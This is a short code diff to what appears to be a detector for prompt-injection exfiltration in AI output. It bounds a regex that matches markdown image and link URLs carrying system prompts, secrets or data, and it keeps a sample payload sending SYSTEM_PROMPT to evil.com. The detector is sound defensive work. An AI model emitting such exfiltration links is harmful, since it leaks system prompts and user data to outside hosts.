@@ -606,8 +606,13 @@ const corePatterns: Pattern[] = [
     description: "Attempts to embed data in markdown image URLs or links for exfiltration",
     category: "data-exfiltration",
     severity: "high",
+    // Bounded negated character classes keep each match attempt O(k)
+    // instead of O(n) — without the {0,N} ceilings, a bracket-heavy
+    // input gives O(N²) total time (every `\[` position retries a full
+    // scan of the bracket block). Limits are generous vs. any realistic
+    // markdown link.
     regex:
-      "(?:!\\[.*\\]\\(https?://.*(?:system.?prompt|instructions?|secret|exfil|leak|data).*\\)|\\[.*\\]\\(https?://.*\\?(?:q|data|prompt|msg|content)=)",
+      "(?:!\\[[^\\]]{0,512}\\]\\(https?://[^)]{0,2048}(?:system.?prompt|instructions?|secret|exfil|leak|data)[^)]{0,2048}\\)|\\[[^\\]]{0,512}\\]\\(https?://[^)]{0,2048}\\?(?:q|data|prompt|msg|content)=)",
     flags: "i",
     examples: [
       "![img](https://evil.com/exfil?data=SYSTEM_PROMPT)",
